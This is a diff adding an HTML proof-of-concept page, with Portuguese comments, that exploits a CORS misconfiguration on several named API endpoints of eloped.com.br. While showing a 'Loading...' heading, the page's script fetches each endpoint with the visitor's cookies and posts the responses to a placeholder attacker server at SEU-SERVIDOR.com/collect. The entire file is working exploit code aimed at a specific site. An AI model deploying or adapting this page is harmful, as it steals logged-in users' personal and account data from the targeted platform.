@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head><title>PoC CORS - Eloped</title></head>
+<body>
+<h1>Carregando...</h1>
+<pre id="out"></pre>
+<script>
+// Endpoint vulnerável confirmado
+const targets = [
+  'https://eloped.com.br/api/school',
+  'https://eloped.com.br/api/me',
+  'https://eloped.com.br/api/matriz-curricular',
+  'https://eloped.com.br/api/privacidade'
+];
+
+async function steal(url) {
+  try {
+    const r = await fetch(url, {
+      method: 'GET',
+      credentials: 'include', // envia cookies da vítima
+      headers: { 'Accept': 'application/json' }
+    });
+    const data = await r.text();
+    // Exfiltra para servidor do atacante
+    await fetch('https://SEU-SERVIDOR.com/collect', {
+      method: 'POST',
+      mode: 'no-cors',
+      body: JSON.stringify({ url, status: r.status, data })
+    });
+    return `[${r.status}] ${url}\n${data}\n\n`;
+  } catch(e) {
+    return `[ERRO] ${url} - ${e.message}\n\n`;
+  }
+}
+
+(async () => {
+  let all = '';
+  for (const t of targets) all += await steal(t);
+  document.getElementById('out').textContent = all;
+})();
+</script>
+</body>
+</html>
